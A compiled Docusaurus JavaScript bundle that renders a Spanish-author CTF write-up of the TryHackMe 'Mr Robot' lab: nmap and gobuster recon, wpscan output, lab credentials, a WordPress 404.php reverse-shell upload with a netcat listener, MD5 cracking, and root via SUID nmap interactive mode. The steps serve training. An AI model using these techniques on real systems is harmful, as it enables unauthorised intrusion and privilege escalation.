"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[4731],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return h}});var r=n(7294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function a(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var p=r.createContext({}),l=function(e){var t=r.useContext(p),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=l(e.components);return r.createElement(p.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},u=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,i=e.originalType,p=e.parentName,c=a(e,["components","mdxType","originalType","parentName"]),u=l(n),h=o,m=u["".concat(p,".").concat(h)]||u[h]||d[h]||i;return n?r.createElement(m,s(s({ref:t},c),{},{components:n})):r.createElement(m,s({ref:t},c))}));function h(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var i=n.length,s=new Array(i);s[0]=u;var a={};for(var p in t)hasOwnProperty.call(t,p)&&(a[p]=t[p]);a.originalType=e,a.mdxType="string"==typeof e?e:o,s[1]=a;for(var l=2;l<i;l++)s[l]=n[l];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}u.displayName="MDXCreateElement"},4717:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return a},contentTitle:function(){return p},metadata:function(){return l},toc:function(){return c},default:function(){return u}});var r=n(7462),o=n(3366),i=(n(7294),n(3905)),s=["components"],a={},p=void 0,l={unversionedId:"Cibersecurity/Red Team/Writeups/Mr Robot THM{}",id:"Cibersecurity/Red Team/Writeups/Mr Robot THM{}",title:"Mr Robot THM{}",description:"80, Wordpress, SUID",source:"@site/docs/Cibersecurity/Red Team/Writeups/Mr Robot THM{}.md",sourceDirName:"Cibersecurity/Red Team/Writeups",slug:"/Cibersecurity/Red Team/Writeups/Mr Robot THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Mr Robot THM{}",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Internal THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Internal THM{}"},next:{title:"Oopsie",permalink:"/docs/Cibersecurity/Red Team/Writeups/Oopsie THM{}"}},c=[{value:"80, Wordpress, SUID",id:"80-wordpress-suid",children:[{value:"Nmap",id:"nmap",children:[],level:3},{value:"Gobuster",id:"gobuster",children:[],level:3},{value:"Wpscan",id:"wpscan",children:[],level:3},{value:"First key",id:"first-key",children:[],level:3},{value:"Wordpress ro reverse shell",id:"wordpress-ro-reverse-shell",children:[],level:3},{value:"Linpeas",id:"linpeas",children:[],level:3},{value:"Second key",id:"second-key",children:[],level:3},{value:"Third key",id:"third-key",children:[],level:3}],level:2}],d={toc:c};function u(e){var t=e.components,n=(0,o.Z)(e,s);return(0,i.kt)("wrapper",(0,r.Z)({},d,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h2",{id:"80-wordpress-suid"},"80, Wordpress, SUID"),(0,i.kt)("h3",{id:"nmap"},"Nmap"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"nmap -T4 10.10.19.91")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"PORT    STATE  SERVICE\n22/tcp  closed ssh\n80/tcp  open   http\n443/tcp open   https\n")),(0,i.kt)("h3",{id:"gobuster"},"Gobuster"),(0,i.kt)("p",null,(0,i.kt)("inlineCode",{parentName:"p"},"gobuster dir -u 10.10.19.91 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"),"\nInteresting directories"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"http://10.10.19.91/wp-login.php      WORDPRESS LOGIN\nhttp://10.10.19.91/0/                WORDPRESS BLOG\nhttp://10.10.19.91/image/            WORDPRESS BLOG IMAGE\nhttp://10.10.19.91/wp-content/       WITE BLACKGROUNG\nhttp://10.10.19.91/admin/            RELOADING WEB\nhttp://10.10.19.91/license           USER:PASSWORD in Inspector\nhttp://10.10.19.91/readme            USELESS MESSAGE\nhttp://10.10.19.91/robots            FIRST KEY\n\n\n")),(0,i.kt)("h3",{id:"wpscan"},"Wpscan"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"}," \n[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).\n | Found By: Emoji Settings (Passive Detection)\n |  - http://10.10.19.91/082c96f.html, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.3.1'\n | Confirmed By: Meta Generator (Passive Detection)\n |  - http://10.10.19.91/082c96f.html, Match: 'WordPress 4.3.1'\n \n[+] WordPress theme in use: twentyfifteen\n | Location: http://10.10.19.91/wp-content/themes/twentyfifteen/\n | Last Updated: 2022-01-25T00:00:00.000Z\n | Readme: http://10.10.19.91/wp-content/themes/twentyfifteen/readme.txt\n | [!] The version is out of date, the latest version is 3.1\n | Style URL: http://10.10.19.91/wp-content/themes/twentyfifteen/style.css?ver=4.3.1\n | Style Name: Twenty Fifteen\n | Style URI: https://wordpress.org/themes/twentyfifteen/\n | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In 404 Page (Passive Detection)\n |\n | Version: 1.3 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://10.10.19.91/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'\n\n")),(0,i.kt)("h3",{id:"first-key"},"First key"),(0,i.kt)("p",null,"Information obtained:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"http://wordpress.org/?v=4.3.1\nelliot:ER28-0652\n\n")),(0,i.kt)("p",null,"In the folder ",(0,i.kt)("inlineCode",{parentName:"p"},"/robots"),", we find the first key. "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"User-agent: *\nfsocity.dic\nkey-1-of-3.txt\n")),(0,i.kt)("p",null,"If we go to ",(0,i.kt)("inlineCode",{parentName:"p"},"/fsocity.dic"),", we download a dictionary. Will be usefull for a future bruteforce attack.\nFurthermore, if we go to ",(0,i.kt)("inlineCode",{parentName:"p"},"key-1-of-3.txt"),", we find the first flag."),(0,i.kt)("h3",{id:"wordpress-ro-reverse-shell"},"Wordpress ro reverse shell"),(0,i.kt)("p",null,"As we did in the Internal machine, we can establish a reverse shell using wordpress.\nFor that we use the information provided in this web: ",(0,i.kt)("a",{parentName:"p",href:"https://www.hacknos.com/wordpress-shell-upload/"},"https://www.hacknos.com/wordpress-shell-upload/")," using the 404.php method.\nFor the reverse shell, we use the pentestmonkey php reverse shell: ",(0,i.kt)("a",{parentName:"p",href:"https://github.com/pentestmonkey/php-reverse-shell"},"https://github.com/pentestmonkey/php-reverse-shell")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"nc -lvnp 5555"),"on our machine."),(0,i.kt)("p",null,"We can upgrade our shell using this info: ",(0,i.kt)("a",{parentName:"p",href:"https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/"},"https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/")),(0,i.kt)("h3",{id:"linpeas"},"Linpeas"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"SUID\n-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap\n")),(0,i.kt)("h3",{id:"second-key"},"Second key"),(0,i.kt)("p",null,"We go to the ",(0,i.kt)("inlineCode",{parentName:"p"},"/home")," directory and foung this user and password on md5:",(0,i.kt)("inlineCode",{parentName:"p"},"robot:c3fcd3d76192e4007dfb496cca67e13b"),"  And  the cracked password is ",(0,i.kt)("inlineCode",{parentName:"p"},"abcdefghijklmnopqrstuvwxyz"),".\nNow we login as ",(0,i.kt)("inlineCode",{parentName:"p"},"robot")," and open the file ",(0,i.kt)("inlineCode",{parentName:"p"},"key-2-of-3.txt"),"."),(0,i.kt)("h3",{id:"third-key"},"Third key"),(0,i.kt)("p",null,"As SUID says, there is something with nmap.\nTo exploit it, just initiate it with interactive mode ",(0,i.kt)("inlineCode",{parentName:"p"},"nmap --interactive")," and write ",(0,i.kt)("inlineCode",{parentName:"p"},"!sh"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"# whoami\nroot\n\n# ls\nfirstboot_done  key-3-of-3.txt\n")))}u.isMDXComponent=!0}}]);